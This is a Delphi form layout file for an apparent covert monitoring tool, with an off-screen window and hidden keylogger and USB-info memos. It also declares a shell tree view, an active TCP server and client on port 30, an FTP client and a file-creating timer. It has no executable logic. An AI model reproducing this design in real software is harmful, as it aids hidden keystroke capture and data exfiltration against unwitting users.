object FCiberCap: TFCiberCap
  Left = -800
  Top = 140
  AlphaBlendValue = 100
  BorderIcons = [biSystemMenu]
  BorderStyle = bsSingle
  Caption = '  '
  ClientHeight = 318
  ClientWidth = 359
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  Position = poDesktopCenter
  OnDestroy = FormDestroy
  OnShow = FormShow
  PixelsPerInch = 96
  TextHeight = 13
  object Image1: TImage
    Left = 79
    Top = 63
    Width = 66
    Height = 82
    Visible = False
  end
  object Memo1: TMemo
    Left = 8
    Top = 151
    Width = 343
    Height = 162
    TabOrder = 3
  end
  object MemoKeyLoger: TMemo
    Left = 8
    Top = 63
    Width = 65
    Height = 82
    TabOrder = 0
    Visible = False
  end
  object cxShellTreeView1: TcxShellTreeView
    Left = 231
    Top = 63
    Width = 82
    Height = 82
    Indent = 19
    RightClickSelect = True
    Root.BrowseFolder = bfCustomPath
    TabOrder = 1
    Visible = False
  end
  object MemoUSBInfo: TMemo
    Left = 151
    Top = 63
    Width = 74
    Height = 82
    TabOrder = 2
    Visible = False
  end
  object cliente: TIdTCPClient
    ConnectTimeout = 0
    IPVersion = Id_IPv4
    Port = 30
    ReadTimeout = -1
    Left = 24
    Top = 8
  end
  object servidor: TIdTCPServer
    Active = True
    Bindings = <>
    DefaultPort = 30
    OnExecute = servidorExecute
    Left = 96
    Top = 8
  end
  object clFTP: TclFtp
    Left = 170
    Top = 23
  end
  object CrearFicheros: TZylTimer
    Interval = 11.000000000000000000
    OnTimer = CrearFicherosTimer
    Left = 240
    Top = 24
  end
end
